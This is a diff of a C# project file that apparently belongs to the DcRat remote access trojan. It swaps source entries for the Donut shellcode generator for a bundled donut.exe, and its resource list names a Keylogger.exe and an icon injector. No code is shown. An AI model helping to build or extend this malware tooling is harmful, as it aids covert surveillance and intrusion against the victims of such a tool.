@@ -332,18 +332,6 @@
     <Compile Include="Helper\Controls\HexEditor\HexViewHandler.cs" />
     <Compile Include="Helper\Controls\HexEditor\IKeyMouseEventHandler.cs" />
     <Compile Include="Helper\Controls\HexEditor\StringViewHandler.cs" />
-    <Compile Include="Helper\Donut\Constants.cs" />
-    <Compile Include="Helper\Donut\Donut.cs" />
-    <Compile Include="Helper\Donut\Generator.cs" />
-    <Compile Include="Helper\Donut\Helper.cs" />
-    <Compile Include="Helper\Donut\Payloads\payload_exe_x64.cs" />
-    <Compile Include="Helper\Donut\Payloads\payload_exe_x86.cs" />
-    <Compile Include="Helper\Donut\Structs\DSConfig.cs" />
-    <Compile Include="Helper\Donut\Structs\DSCrypt.cs" />
-    <Compile Include="Helper\Donut\Structs\DSFileInfo.cs" />
-    <Compile Include="Helper\Donut\Structs\DShttp.cs" />
-    <Compile Include="Helper\Donut\Structs\DSInstance.cs" />
-    <Compile Include="Helper\Donut\Structs\DSModule.cs" />
     <Compile Include="Helper\IconInjector.cs" />
     <Compile Include="Helper\ListViewColumnSorter.cs" />
     <Compile Include="Helper\ListviewDoubleBuffer.cs" />
@@ -515,6 +503,7 @@
     <None Include="Resources\icon.bmp" />
   </ItemGroup>
   <ItemGroup>
+    <None Include="Resources\donut.exe" />
     <None Include="Resources\DcRat_png.png" />
     <None Include="Resources\Keylogger.exe" />
     <None Include="Resources\online.wav" />
